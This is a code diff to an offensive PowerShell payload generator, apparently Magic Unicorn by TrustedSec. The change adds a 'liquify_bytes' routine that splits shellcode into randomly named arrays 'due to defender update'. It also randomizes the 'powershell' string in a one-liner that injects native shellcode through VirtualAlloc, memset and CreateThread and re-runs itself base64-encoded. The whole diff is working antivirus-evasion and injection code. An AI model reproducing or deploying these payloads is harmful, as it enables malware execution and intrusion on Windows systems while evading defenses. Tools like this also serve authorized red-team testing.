@@ -429,7 +429,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2.3 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -457,6 +457,99 @@ def gen_usage():
     print("Generate .SettingContent-ms: python unicorn.py ms")
     print("Help Menu: python unicorn.py --help\n")
 
+# randomize due to defender update
+def liquify_bytes(bytes, stub):
+    # split bytes
+    a1 = ""
+    a2 = ""
+    a3 = ""
+    a4 = ""
+    a5 = ""
+    a6 = ""
+    a7 = ""
+    bytes = bytes.split(",")
+    counter = 0
+    a1 = generate_random_string(2,2)
+    assemble = ("$" + a1 +"=@(") 
+    for byte in bytes:
+        byte = byte.rstrip()
+        if counter < 100:
+            if counter < 200:
+                assemble = assemble + byte + ","
+        if counter >= 100:
+            if counter == 100:
+                a2 = generate_random_string(2,2)
+                assemble = (assemble + ");" + "$" + a2 + "=@(") + byte + ","
+
+            if counter != 100:
+                if counter < 200:
+                    assemble = assemble + byte + ","
+                if counter >= 200:
+                    if counter == 200:
+                        a3 = generate_random_string(2,2)
+                        assemble = (assemble + ");" + "$" + a3 + "=@(") + byte + ","
+                    if counter > 200:
+                        if counter < 300:
+                            assemble = assemble + byte + ","
+
+                        if counter >= 300:
+                            if counter == 300:
+                                a4 = generate_random_string(2,2)
+                                assemble = (assemble + ");" + "$" + a4 + "=@(") + byte + ","
+                            if counter != 300:
+                                assemble = assemble + byte + ","
+
+                    if counter > 400:
+                        if counter < 500:
+                            assemble = assemble + byte + ","
+
+                        if counter >= 500:
+                            if counter == 500:
+                                a5 = generate_random_string(2,2)
+                                assemble = (assemble + ");" + "$" + a5 + "=@(") + byte + ","
+                            if counter != 500:
+                                assemble = assemble + byte + ","
+
+                    if counter > 500:
+                        if counter < 600:
+                            assemble = assemble + byte + ","
+
+                        if counter >= 600:
+                            if counter == 600:
+                                a6 = generate_random_string(2,2)
+                                assemble = (assemble + ");" + "$" + a6 + "=@(") + byte + ","
+                            if counter != 600:
+                                assemble = assemble + byte + ","
+
+                    if counter > 600:
+                        if counter < 700:
+                            assemble = assemble + byte + ","
+
+                        if counter >= 700:
+                            if counter == 700:
+                                a7 = generate_random_string(2,2)
+                                assemble = (assemble + ");" + "$" + a7 + "=@(") + byte + ","
+                            if counter != 700:
+                                assemble = assemble + byte + ","
+
+        counter = counter + 1
+    assemble = (assemble + ");")
+    assemble = assemble.replace(",)", ")")
+    assemble = (assemble[:-1] + ";" + stub + " =" + " $" + a1)
+    if a2 != "":
+        assemble = assemble + " + $" + a2
+    if a3 != "":
+        assemble = assemble + " + $" + a3
+    if a4 != "":
+        assemble = assemble + " + $" + a4 
+    if a5 != "":
+        assemble = assemble + " + $" + a5 
+    if a6 != "":
+        assemble = assemble + " + $" + a6 
+    if a7 != "":
+        assemble = assemble + " + $" + a7
+
+    return assemble
 
 # this will convert any url to hexformat for download/exec payload
 def url_hexified(url):
@@ -718,7 +811,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
         # here's our shellcode prepped and ready to go
         shellcode = newdata[:-1]
-    
+
         # if we aren't using download/exec
         if not "url=" in ipaddr:
             # write out rc file
@@ -741,18 +834,22 @@ def gen_shellcode_attack(payload, ipaddr, port):
     var10 = "$" + generate_random_string(2, 2) # $i
     var11 = "$" + generate_random_string(2, 2) # $w
     var12 = (str(generate_random_number(1001,1010)))
+    var13 = "$" + generate_random_string(2, 2)
+    var14 = (var13 + '="powershell";')
+
+    # var 8 is our stub for byte liquify
+    shellcode = liquify_bytes(shellcode, var8)
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
+    powershell_code = (var14 + r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;;[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\Windows$powershell\v1.0\$powershell";iex "& $3 $2 $h"}""" % (shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
         "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
         "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
-        "$w", var11).replace("$randstack", var12)
+        "$w", var11).replace("$randstack", var12).replace("$powershell", var13)
 
     return powershell_code
-
 
 def gen_ps1_attack(ps1path):
     if os.path.isfile(ps1path):
@@ -881,7 +978,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                 print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
                 print("[!] Total Payload Length Size: " + str(len(full_attack)))
                 raw_input("Press {return} to continue.")
-                sys.exit()
+                #sys.exit()
 
             # format for dde specific payload
             if attack_modifier == "dde":
